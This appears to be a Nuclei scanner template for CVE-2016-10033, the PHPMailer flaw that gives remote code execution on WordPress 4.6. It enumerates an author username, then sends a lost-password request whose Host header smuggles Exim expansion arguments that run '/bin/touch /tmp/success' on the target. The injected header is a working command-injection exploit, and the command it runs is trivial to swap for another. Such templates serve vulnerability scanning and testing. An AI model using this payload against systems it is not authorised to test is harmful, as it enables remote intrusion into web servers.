id: cve-2016-10033
info:
  author: princechaddha
  description: The mailSend function in the isMail transport in PHPMailer before 5.2.18
    might allow remote attackers to pass extra parameters to the mail command and
    consequently execute arbitrary code via a \" (backslash double quote) in a crafted
    Sender property.
  name: Wordpress 4.6 Remote Code Execution
  reference: https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
  severity: high
  tags: wordpress,cve,cve2016,rce
requests:
- extractors:
  - group: 1
    internal: true
    name: username
    part: body
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - wp-login.php?checkemail=confirm
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'GET /?author=1 HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Language: en-US,en;q=0.9

    Connection: close


    '
  - 'POST /wp-login.php?action=lostpassword HTTP/1.1

    Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}}
    null)

    Connection: close

    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

    Accept: */*

    Content-Length: 56

    Content-Type: application/x-www-form-urlencoded


    wp-submit=Get+New+Password&redirect_to=&user_login={{username}}


    '
  unsafe: true
